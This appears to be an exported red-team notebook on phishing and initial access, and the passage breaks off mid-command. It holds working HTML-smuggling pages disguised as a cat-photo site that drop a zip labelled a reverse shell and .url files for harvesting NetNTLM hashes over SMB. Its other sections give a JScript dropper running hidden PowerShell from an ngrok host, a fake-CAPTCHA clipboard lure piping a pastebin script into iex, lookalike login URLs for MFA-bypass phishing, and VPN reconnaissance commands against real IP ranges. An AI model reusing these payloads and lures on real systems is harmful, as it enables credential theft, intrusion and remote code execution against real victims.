_0x3435=function(_0x34351f,_0x49e228){_0x34351f=_0x34351f-0x123;var _0x8253ea=_0xb6f9c[_0x34351f];return _0x8253ea;},_0x3435(_0x5e5c5a,_0x3fb587);}function _0xb6f9(){var _0x26cb6b=[&#39;style&#39;,&#39;navigator&#39;,&#39;3174BvxMPM&#39;,&#39;32424XjsJJz&#39;,&#39;octet/stream&#39;,&#39;488097ACOpOH&#39;,&#39;createElement&#39;,&#39;100lZlBgX&#39;,&#39;body&#39;,&#39;7rGtUXc&#39;,&#39;10KNOMWT&#39;,&#39;atob&#39;,&#39;charCodeAt&#39;,&#39;download&#39;,&#39;666448LqMtFp&#39;,&#39;URL&#39;,&#39;href&#39;,&#39;length&#39;,&#39;msSaveOrOpenBlob&#39;,&#39;Audit\x20Report.zip&#39;,&#39;282AeHtAd&#39;,&#39;log&#39;,&#39;15276CBSnXC&#39;,&#39;2057YHzbKS&#39;,&#39;buffer&#39;,&#39;revokeObjectURL&#39;,&#39;display:\x20none&#39;,&#39;click&#39;,&#39;536956pjyOHU&#39;,&#39;238706EQtlvF&#39;];_0xb6f9=function(){return _0x26cb6b;};return _0xb6f9();}if(window[_0x1b2c3d(0x136)][_0x1b2c3d(0x129)])window[_0x1b2c3d(0x136)][_0x1b2c3d(0x129)](blob,fileName);else{var a=document[_0x1b2c3d(0x13b)](&#39;a&#39;);console[_0x1b2c3d(0x12c)](a),document[_0x1b2c3d(0x13d)][&#39;appendChild&#39;](a),a[_0x1b2c3d(0x135)]=_0x1b2c3d(0x131);var url=window[_0x1b2c3d(0x126)][&#39;createObjectURL&#39;](blob);a[_0x1b2c3d(0x127)]=url,a[_0x1b2c3d(0x124)]=fileName,a[_0x1b2c3d(0x132)](),window[_0x1b2c3d(0x126)][_0x1b2c3d(0x130)](url);}</p><p>        &lt;/script&gt;</p><p>&lt;/body&gt;</p><p>&lt;/html&gt;</p><p></p></div><div class='page'><a name="Methdology--Initial_Access--Phishing_techniques--Html_Smuggling--html_smuggling_v2--meow_883.html"></a><h1 class='title level-6'>meow</h1><br/><p>&lt;html&gt;</p><p>    &lt;body&gt;</p><p>    &lt;h1&gt;Cat Generator&lt;/h1&gt;</p><p>        &lt;script&gt;</p><p>            function base64ToArrayBuffer(base64) {</p><p>            var binary_string = window.atob(base64);</p><p>            var len = binary_string.length;</p><p>            </p><p>            var bytes = new Uint8Array( len );</p><p>                for (var i = 0; i &lt; len; i++) { bytes[i] = binary_string.charCodeAt(i); }</p><p>                return bytes.buffer;</p><p>            }</p><p></p><p>            // 32bit simple reverse shell</p><p>            var file = &#39;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&#39;;</p><p>            var data = base64ToArrayBuffer(file);</p><p>            var blob = new Blob([data], {type: &#39;octet/stream&#39;});</p><p>            var fileName = &#39;meow.zip&#39;</p><p></p><p>            if (window.navigator.msSaveOrOpenBlob) {</p><p>                window.navigator.msSaveOrOpenBlob(blob,fileName);</p><p>            } else {</p><p>                var a = document.createElement(&#39;a&#39;);</p><p>                console.log(a);</p><p>                document.body.appendChild(a);</p><p>                a.style = &#39;display: none&#39;;</p><p>                var url = window.URL.createObjectURL(blob);</p><p>                a.href = url;</p><p>                a.download = fileName;</p><p>                a.click();</p><p>                window.URL.revokeObjectURL(url);</p><p>            }</p><p>        &lt;/script&gt;</p><p>  &lt;main&gt;</p><p>    &lt;section&gt;</p><p>      &lt;h2&gt;Free Cat Downloads&lt;/h2&gt;</p><p>      &lt;!-- TODO: Add link to cat photos --&gt;</p><p>      &lt;a href=&quot;<a href="https://freecatphotoapp.com">https://freecatphotoapp.com</a>&quot;&gt;&lt;img src=&quot;<a href="https://cdn.freecodecamp.org/curriculum/cat-photo-app/relaxing-cat.jpg">https://cdn.freecodecamp.org/curriculum/cat-photo-app/relaxing-cat.jpg</a>&quot; alt=&quot;A cute orange cat lying on its back.&quot;&gt;&lt;/a&gt;</p><p>      &lt;img src=&quot;<a href="http://canarytokens.com/about/feedback/r28shr6x3i35a7kbzrdtct8u4/contact.php">http://canarytokens.com/about/feedback/r28shr6x3i35a7kbzrdtct8u4/contact.php</a>&quot;/&gt;</p><p>    &lt;/section&gt;</p><p>    &lt;section&gt;</p><p>      &lt;h2&gt;Refresh For More Cats!&lt;/h2&gt;</p><p>      &lt;h3&gt;Things Cats Love:&lt;/h3&gt;</p><p>      &lt;ul&gt;</p><p>        &lt;li&gt;Cuddles&lt;/li&gt;</p><p>        &lt;li&gt;Laser Pointers&lt;/li&gt;</p><p>        &lt;li&gt;Yarn&lt;/li&gt;</p><p>        &lt;li&gt;Kisses&lt;/li&gt;  </p><p>      &lt;/ul&gt;</p><p>      &lt;img src=&quot;<a href="https://static.vecteezy.com/system/resources/thumbnails/009/665/322/small/cute-kitty-cat-family-greeting-cartoon-element-png.png">https://static.vecteezy.com/system/resources/thumbnails/009/665/322/small/cute-kitty-cat-family-greeting-cartoon-element-png.png</a>&quot; alt=&#39;soon&#39;</p><p>    &lt;/section&gt;</p><p>    &lt;section&gt;</p><p>    &lt;!-- &lt;img src=&quot;<a href="https://clipart-library.com/new_gallery/398422_cute-cat-png.png">https://clipart-library.com/new_gallery/398422_cute-cat-png.png</a>&quot; alt=&#39;Meow.&#39; --&gt;</p><p>    &lt;/section&gt;</p><p>  &lt;/main&gt;</p><p>    &lt;/body&gt;</p><p>&lt;/html&gt;</p></div><div class='page'><a name="Methdology--Initial_Access--Phishing_techniques--Fake_meeting_invite_882.html"></a><h1 class='title level-4'>Fake meeting invite</h1><br/><p><a href="https://www.exandroid.dev/2021/04/24/phishing-with-fake-meeting-invite/">https://www.exandroid.dev/2021/04/24/phishing-with-fake-meeting-invite/</a></p><p></p><p>essentiall looks like teams meeting, redirects to phishing site, gets creds if user gives.</p><p></p><p>Then just have hyperlink go to mf2 bypass phishing to cloned version of <a href="https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=22&ct=1711202932&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26culture%3dnb-no%26country%3dno%26RpsCsrfState%3d79049bc1-2b8c-5e25-d57b-6a30c7186880&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c">https://login.live.com/login.srf?wa=wsignin1.0&amp;rpsnv=22&amp;ct=1711202932&amp;rver=7.0.6738.0&amp;wp=MBI_SSL&amp;wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26culture%3dnb-no%26country%3dno%26RpsCsrfState%3d79049bc1-2b8c-5e25-d57b-6a30c7186880&amp;id=292841&amp;aadredir=1&amp;CBCXT=out&amp;lw=1&amp;fl=dob%2cflname%2cwld&amp;cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c</a></p><p></p><p>with a url like this for instance: <a href="https://login.tearns.com/login.srf?wa=wsignin1.0">https://login.tearns.com/login.srf?wa=wsignin1.0</a></p><p>https://login.tearns.com∕login.srf&amp;wa=ws@t.ly/OLqiN?wa=wsignin1.0</p><p></p><p>You can also use onedrive link and use this site to make it autodownload:</p><p><a href="https://metadataconsulting.blogspot.com/2019/03/OneDrive-2019-Direct-File-Download-URL-Maker.html">https://metadataconsulting.blogspot.com/2019/03/OneDrive-2019-Direct-File-Download-URL-Maker.html</a></p><p></p><p>It will be a brief discussion surrounding workplace procedures and how we want to conduct ourselves with our colleagues moving forward. Hope to see you there then.</p><p></p><p>can also spoof a vendor ofc</p><p></p><p></p><p>Chain this with this <a href="#Methdology--Initial_Access--Phishing_techniques--.url_files_919.html">.url files with html smuggling</a>, and enjoy grabbing hashes. </p><p></p><p><img src="images/882-1.png" alt="images/882-1.png" /></p><p></p></div><div class='page'><a name="Methdology--Initial_Access--Phishing_techniques--nasty_.js_shell_897.html"></a><h1 class='title level-4'>nasty .js shell</h1><br/><p>var wshShell = new ActiveXObject(&quot;WScript.Shell&quot;);</p><p>wshShell.Run(&quot;powershell.exe -ep bypass -WindowStyle Hidden IEX (iwr -usebasicparsing <a href="http://192.168.255.132/obfuscated.ps1)")">http://7.tcp.eu.ngrok.io:10175/obfuscated.ps1)&quot;)</a>;</p></div><div class='page'><a name="Methdology--Initial_Access--Phishing_techniques--m365_customervoice_phishing_905.html"></a><h1 class='title level-4'>m365 customervoice phishing</h1><br/><p><img src="images/905-1.png" alt="images/905-1.png" /></p><p></p><p>ecv.microsoft.com/dzyOyfROjd</p><p></p></div><div class='page'><a name="Methdology--Initial_Access--Phishing_techniques--Google_drive_email_this_file_914.html"></a><h1 class='title level-4'>Google drive "email this file"</h1><br/><p><a href="https://mrd0x.com/abusing-google-drives-email-file-functionality/">https://mrd0x.com/abusing-google-drives-email-file-functionality/</a></p></div><div class='page'><a name="Methdology--Initial_Access--Phishing_techniques--.url_files_919.html"></a><h1 class='title level-4'>.url files</h1><br/><p>can steal netntlm hashes remote if u or victim does not have isp blocked for SMB. companies does not have this luxury of ISP protecting them usually, so they often have it exposed. Use this technique to harvest hashes to crack + username, test on exposed VPN endpoints and jump boxes and potentially their wifi, and/or outlook etc.</p><p></p><p>If user wants to open the file and run it, it grants shell. If user click on it or deletes it from file explorer, hashes is granted.</p><p>If user accepts multiple downloads, they will get cancer.com 🐕🐕🐕.</p><p></p><p></p><p></p><p><code>[InternetShortcut]</code><code></code></p><p><code>URL=https://securify.nl</code><code></code></p><p><code>IconIndex=0</code><code></code></p><p><code>IconFile=\\172.232.128.253\share\</code>cute.png</p><p></p></div><div class='page'><a name="Methdology--Initial_Access--Phishing_techniques--.url_files--initial_920.html"></a><h1 class='title level-5'>initial</h1><br/><p>&lt;html&gt;</p><p>&lt;body&gt;</p><p>&lt;h1&gt;Cat Generator&lt;/h1&gt;</p><p>&lt;script&gt;</p><p>    function base64ToArrayBuffer(base64) {</p><p>        var binary_string = window.atob(base64);</p><p>        var len = binary_string.length;</p><p>        var bytes = new Uint8Array(len);</p><p>        for (var i = 0; i &lt; len; i++) { bytes[i] = binary_string.charCodeAt(i); }</p><p>        return bytes.buffer;</p><p>    }</p><p></p><p>    function downloadFile(fileName, fileData) {</p><p>        var data = base64ToArrayBuffer(fileData);</p><p>        var blob = new Blob([data], {type: &#39;octet/stream&#39;});</p><p>        if (window.navigator.msSaveOrOpenBlob) {</p><p>            window.navigator.msSaveOrOpenBlob(blob, fileName);</p><p>        } else {</p><p>            var a = document.createElement(&#39;a&#39;);</p><p>            document.body.appendChild(a);</p><p>            a.style = &#39;display: none&#39;;</p><p>            var url = window.URL.createObjectURL(blob);</p><p>            a.href = url;</p><p>            a.download = fileName;</p><p>            a.click();</p><p>            window.URL.revokeObjectURL(url);</p><p>        }</p><p>    }</p><p></p><p>    var file = &#39;W0ludGVybmV0U2hvcnRjdXRdDQoNClVSTD1maWxlOi8vMTkyLjE2OC4yNTUuMTMyL3NoYXJlL25vdGVzLmxuaw0KDQpJY29uRmlsZT1DOlxXaW5kb3dzXFN5c3RlbTMyXGltYWdlcmVzLmRsbA0KSWNvbkluZGV4PTY3DQpIb3RLZXk9MA0KSURMaXN0PQ0K&#39;;</p><p>    var fileName = &#39;secret.url&#39;;</p><p></p><p>    // Trigger the download</p><p>    downloadFile(fileName, file);</p><p></p><p>    // Redirect after 5 seconds</p><p>    setTimeout(function() {</p><p>        window.location.href = &#39;<a href="https://gooniboon1.neocities.org/meow';">https://gooniboon1.neocities.org/meow&#39;;</a></p><p>    }, 1000); // 5000 milliseconds = 5 seconds</p><p>&lt;/script&gt;</p><p></p><p>&lt;main&gt;</p><p>    &lt;section&gt;</p><p>        &lt;h2&gt;Free Cat Downloads&lt;/h2&gt;</p><p>        &lt;a href=&quot;<a href="https://freecatphotoapp.com">https://freecatphotoapp.com</a>&quot;&gt;&lt;img src=&quot;<a href="https://cdn.freecodecamp.org/curriculum/cat-photo-app/relaxing-cat.jpg">https://cdn.freecodecamp.org/curriculum/cat-photo-app/relaxing-cat.jpg</a>&quot; alt=&quot;A cute orange cat lying on its back.&quot;&gt;&lt;/a&gt;</p><p>        &lt;img src=&quot;<a href="http://canarytokens.com/about/feedback/r28shr6x3i35a7kbzrdtct8u4/contact.php">http://canarytokens.com/about/feedback/r28shr6x3i35a7kbzrdtct8u4/contact.php</a>&quot;/&gt;</p><p>    &lt;/section&gt;</p><p>    &lt;section&gt;</p><p>        &lt;h2&gt;Refresh For More Cats!&lt;/h2&gt;</p><p>        &lt;h3&gt;Things Cats Love:&lt;/h3&gt;</p><p>        &lt;ul&gt;</p><p>            &lt;li&gt;Cuddles&lt;/li&gt;</p><p>            &lt;li&gt;Laser Pointers&lt;/li&gt;</p><p>            &lt;li&gt;Yarn&lt;/li&gt;</p><p>            &lt;li&gt;Kisses&lt;/li&gt;        </p><p>        &lt;/ul&gt;</p><p>        &lt;img src=&quot;<a href="https://png.pngtree.com/png-clipart/20220620/ourmid/pngtree-pink-cute-cat-icon-animal-png-yuri-png-image_5230763.png">https://png.pngtree.com/png-clipart/20220620/ourmid/pngtree-pink-cute-cat-icon-animal-png-yuri-png-image_5230763.png</a>&quot; alt=&#39;Meow.&#39;&gt;</p><p>    &lt;/section&gt;</p><p>&lt;/main&gt;</p><p></p><p>&lt;/body&gt;</p><p>&lt;/html&gt;</p></div><div class='page'><a name="Methdology--Initial_Access--Phishing_techniques--.url_files--initial--second_921.html"></a><h1 class='title level-6'>second</h1><br/><p>&lt;html&gt;</p><p>&lt;body&gt;</p><p>&lt;h1&gt;Cat Generator&lt;/h1&gt;</p><p>&lt;script&gt;</p><p>    function base64ToArrayBuffer(base64) {</p><p>        var binary_string = window.atob(base64);</p><p>        var len = binary_string.length;</p><p>        var bytes = new Uint8Array(len);</p><p>        for (var i = 0; i &lt; len; i++) { bytes[i] = binary_string.charCodeAt(i); }</p><p>        return bytes.buffer;</p><p>    }</p><p></p><p>    function downloadFile(fileName, fileData) {</p><p>        var data = base64ToArrayBuffer(fileData);</p><p>        var blob = new Blob([data], {type: &#39;octet/stream&#39;});</p><p>        if (window.navigator.msSaveOrOpenBlob) {</p><p>            window.navigator.msSaveOrOpenBlob(blob, fileName);</p><p>        } else {</p><p>            var a = document.createElement(&#39;a&#39;);</p><p>            document.body.appendChild(a);</p><p>            a.style = &#39;display: none&#39;;</p><p>            var url = window.URL.createObjectURL(blob);</p><p>            a.href = url;</p><p>            a.download = fileName;</p><p>            a.click();</p><p>            window.URL.revokeObjectURL(url);</p><p>        }</p><p>    }</p><p></p><p>    var file = &#39;W0ludGVybmV0U2hvcnRjdXRdDQoNClVSTD1maWxlOi8vMTkyLjE2OC4yNTUuMTMyL3NoYXJlL25vdGVzLmxuaw0KDQpJY29uRmlsZT1DOlxXaW5kb3dzXFN5c3RlbTMyXGltYWdlcmVzLmRsbA0KSWNvbkluZGV4PTY3DQpIb3RLZXk9MA0KSURMaXN0PQ0K&#39;;</p><p>    var data = base64ToArrayBuffer(file);</p><p>    var blob = new Blob([data], {type: &#39;octet/stream&#39;});</p><p>    var fileName = &#39;SPAM.url&#39;;</p><p></p><p>    // Trigger the download</p><p>    downloadFile(fileName, file);</p><p></p><p>    // Refresh the page after 5 seconds</p><p>    setTimeout(function() {</p><p>        location.reload();</p><p>    }, 3000); // 5000 milliseconds = 0,5 seconds</p><p>&lt;/script&gt;</p><p></p><p>&lt;main&gt;</p><p>    &lt;section&gt;</p><p>        &lt;h2&gt;Free Cat Downloads&lt;/h2&gt;</p><p>        &lt;a href=&quot;<a href="https://freecatphotoapp.com">https://freecatphotoapp.com</a>&quot;&gt;&lt;img src=&quot;<a href="https://cdn.freecodecamp.org/curriculum/cat-photo-app/relaxing-cat.jpg">https://cdn.freecodecamp.org/curriculum/cat-photo-app/relaxing-cat.jpg</a>&quot; alt=&quot;A cute orange cat lying on its back.&quot;&gt;&lt;/a&gt;</p><p>        &lt;img src=&quot;<a href="http://canarytokens.com/about/feedback/r28shr6x3i35a7kbzrdtct8u4/contact.php">http://canarytokens.com/about/feedback/r28shr6x3i35a7kbzrdtct8u4/contact.php</a>&quot;/&gt;</p><p>    &lt;/section&gt;</p><p>    &lt;section&gt;</p><p>        &lt;h2&gt;Refresh For More Cats!&lt;/h2&gt;</p><p>        &lt;h3&gt;Things Cats Love:&lt;/h3&gt;</p><p>        &lt;ul&gt;</p><p>            &lt;li&gt;Cuddles&lt;/li&gt;</p><p>            &lt;li&gt;Laser Pointers&lt;/li&gt;</p><p>            &lt;li&gt;Yarn&lt;/li&gt;</p><p>            &lt;li&gt;Kisses&lt;/li&gt;        </p><p>        &lt;/ul&gt;</p><p>        &lt;img src=&quot;<a href="https://png.pngtree.com/png-clipart/20220620/ourmid/pngtree-pink-cute-cat-icon-animal-png-yuri-png-image_5230763.png">https://png.pngtree.com/png-clipart/20220620/ourmid/pngtree-pink-cute-cat-icon-animal-png-yuri-png-image_5230763.png</a>&quot; alt=&#39;Meow.&#39;&gt;</p><p>    &lt;/section&gt;</p><p>&lt;/main&gt;</p><p></p><p>&lt;/body&gt;</p><p>&lt;/html&gt;</p><p></p></div><div class='page'><a name="Methdology--Initial_Access--Phishing_techniques--Phishing_Infrastructure_925.html"></a><h1 class='title level-4'>Phishing Infrastructure</h1><br/><p><img src="images/925-1.png" alt="images/925-1.png" /></p><p></p><p><a href="https://www.youtube.com/watch?v=sBhKUFcpDTA">https://www.youtube.com/watch?v=sBhKUFcpDTA</a></p></div><div class='page'><a name="Methdology--Initial_Access--Phishing_techniques--Fake_captha_cmd_run_951.html"></a><h1 class='title level-4'>Fake captha cmd run</h1><br/><p><a href="https://youtu.be/lSa_wHW1pgQ?t=1268">https://youtu.be/lSa_wHW1pgQ?t=1268</a></p><p></p><p><img src="images/951-1.png" alt="images/951-1.png" /></p><p></p><p>click this, it pops open with verification requests, by then u have already copy pasted malware on ur clipboard, if u follow the steps victim will get RCEd. </p><p></p><p><img src="images/951-2.png" alt="images/951-2.png" /></p><p></p><p></p><p></p><p><code><span style="color:#b36767;">&lt;</span></code><code>!DOCTYPE html</code><code><span style="color:#b36767;">&gt;</span></code><code></code></p><p><code></code><code><span style="color:#b36767;">&lt;</span></code><code>html lang=&quot;en&quot;</code><code><span style="color:#b36767;">&gt;</span></code><code></code></p><p><code></code><code><span style="color:#b36767;">&lt;</span></code><code>head</code><code><span style="color:#b36767;">&gt;</span></code><code></code></p><p><code>    </code><code><span style="color:#b36767;">&lt;</span></code><code>meta charset=&quot;UTF-8&quot;</code><code><span style="color:#b36767;">&gt;</span></code><code></code></p><p><code>    </code><code><span style="color:#b36767;">&lt;</span></code><code>title</code><code><span style="color:#b36767;">&gt;</span></code><code>Clipboard Example</code><code><span style="color:#b36767;">&lt;</span></code><code>/title</code><code><span style="color:#b36767;">&gt;</span></code><code></code></p><p><code>    </code><code><span style="color:#b36767;">&lt;</span></code><code>style</code><code><span style="color:#b36767;">&gt;</span></code><code></code></p><p><code>        body {</code><code></code></p><p><code>            display: flex;</code><code></code></p><p><code>            justify-content: center;</code><code></code></p><p><code>            align-items: center;</code><code></code></p><p><code>            height: 100vh;</code><code></code></p><p><code>            font-family: Arial, sans-serif;</code><code></code></p><p><code>        }</code><code></code></p><p><code>    </code><code><span style="color:#b36767;">&lt;</span></code><code>/style</code><code><span style="color:#b36767;">&gt;</span></code><code></code></p><p><code></code><code><span style="color:#b36767;">&lt;</span></code><code>/head</code><code><span style="color:#b36767;">&gt;</span></code><code></code></p><p><code></code><code><span style="color:#b36767;">&lt;</span></code><code>body</code><code><span style="color:#b36767;">&gt;</span></code><code></code></p><p><code>    </code><code><span style="color:#b36767;">&lt;</span></code><code>button id=&quot;copyButton&quot;</code><code><span style="color:#b36767;">&gt;</span></code><code>Copy to clipboard</code><code><span style="color:#b36767;">&lt;</span></code><code>/button</code><code><span style="color:#b36767;">&gt;</span></code><code></code></p><p><code>    </code><code><span style="color:#b36767;">&lt;</span></code><code>script</code><code><span style="color:#b36767;">&gt;</span></code><code></code></p><p><code>        const copyButton = document.getElementById(&#39;copyButton&#39;);</code><code></code></p><p><code>        copyButton.addEventListener(&#39;click&#39;, function() {</code><code></code></p><p><code>            navigator.clipboard.writeText(&#39;This is the text to be copied.&#39;);</code><code></code></p><p><code>        });</code><code></code></p><p><code>    </code><code><span style="color:#b36767;">&lt;</span></code><code>/script</code><code><span style="color:#b36767;">&gt;</span></code><code></code></p><p><code></code><code><span style="color:#b36767;">&lt;</span></code><code>/body</code><code><span style="color:#b36767;">&gt;</span></code><code></code></p><p><code></code><code><span style="color:#b36767;">&lt;</span></code><code>/html</code><code><span style="color:#b36767;">&gt;</span></code></p><p></p><p></p><p>powershell -c iwr <a href="https://pastebin.com/raw/4ea3QGs5">https://pastebin.com/raw/4ea3QGs5</a> | iex                                                             # Captha verifiction ID Request: 123223 - 13321 🤖✅</p><p></p></div><div class='page'><a name="Methdology--Initial_Access--VPN_910.html"></a><h1 class='title level-3'>VPN</h1><br/><p><ul><li>UDP 500 for Ike | Check for this vuln <a href="https://raxis.com/blog/ike-vpns-supporting-aggressive-mode/">https://raxis.com/blog/ike-vpns-supporting-aggressive-mode/</a></li><li>UDP 4500 for IPSEC Nat-Traversal Mode</li><li>If port number 443 is open, it is an SSL VPN.</li><li>If port number 3389 is open, it is RDP.</li><li>If port number 22 is open, it&#39;s SSH.  <a href="https://serverfault.com/questions/451381/which-ports-for-ipsec-lt2p">https://serverfault.com/questions/451381/which-ports-for-ipsec-lt2p</a></li></ul></p><p></p><p><img src="images/910-1.png" alt="images/910-1.png" /></p><p></p><p></p><p>Scan IP ranges of ASN for port 3389, 22, 500 and 443. Get all subdomains of websites to look for vpn subdomain. </p><p></p><p>subfinder -d edu.ee -all -v -o subs.txt</p><p>cat subs.txt | httpx -probe | grep -i SUCCESS | cut -d &#39;[&#39; -f1 | tee subs.alive</p><p></p><p>cat subs.alive | grep -i vpn</p><p>cat subs.alive | grep -i vps</p><p>cat subs.alive | grep -i dev</p><p>cat subs.alive | grep -i test</p><p></p><p>cat subs.alive | httpx -sc -title -ms &#39;VPN&#39; -p 80,443,8080,8443 -follow-redirects | tee httpx.log</p><p>cat subs.alive | httpx -sc -title -ms &#39;citrix&#39; -p 80,443,8080,8443 -follow-redirects | tee httpx.log</p><p>(httpx doesnt scan non http/s ports lol)</p><p></p><p></p><p></p><p>go to <a href="https://bgp.he.net/">https://bgp.he.net/</a> and search ipv4 address of the website you wanna use to find the rest of comapny ASN and ip ranges. grab the ip range/s you wanna test.</p><p>rustscan -a 193.40.0.0/16 -p 80,443 --ulimit 5000 -g | tee rust.grep &amp;&amp; cut -d &#39; &#39; -f1 rust.grep | tee rust.ip</p><p></p><p>next you can do this to resolve all IPs to the corresponding domains. this will basically find all the alive subdomains in their ip range:</p><p>for ip in $(cat rust.ip); do</p><p>    domain=$(dig +short -x $ip)</p><p>    echo &quot;$ip: $domain&quot; &gt;&gt; ip_domains.txt</p><p>done &amp;&amp; awk -F &#39;: &#39; &#39;{print $2}&#39; ip_domains.txt | sed &#39;s/\.$//; /^$/d&#39; | tee ip_domains_clean.txt</p><p></p><p>check for IPSec based VPNs over UDP: (might wanna run 2-3 times to verify)</p><p>rustscan -a rust.ip -p 500 --ulimit 5000 -g -- -sU -v</p><p></p><p>Go through all domains/subdomains and scout for exposed VPNs:</p><p>cat ip_domains_clean.txt | httpx -sc -title -ms &#39;VPN&#39; -p 80,443,8080,8443 -follow-redirects | tee VPNs.txt</p><p>cat ip_domains_clean.txt | httpx -sc -title -ms &#39;citrix&#39; -p 80,443,8080,8443 -follow-redirects | tee VPNs.txt</p><p></p><p>Seems to work well:</p><p>cat equinor_subs.alive.txt | httpx -sc -title -mr &quot;\bVpn\b|\bCisco\b|\bCitrix\b|\bForti&quot; -p 80,443 -follow-redirects | tee vpn.txt</p><p></p><p>All over tor technique:</p><p>proxychains -q masscan -p0 193.40.0.0/16 --ping --rate=500 | tee pingsweep.txt &amp;&amp; cat pingsweep.txt | cut -d &#39;n&#39; -f 3 | grep -o &#39;[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}&#39; | tee ips.txt &amp;&amp; for ip in $(cat ips.txt); do</p><p>    domain=$(proxychains -q dig +short -x $ip)</p><p>    echo 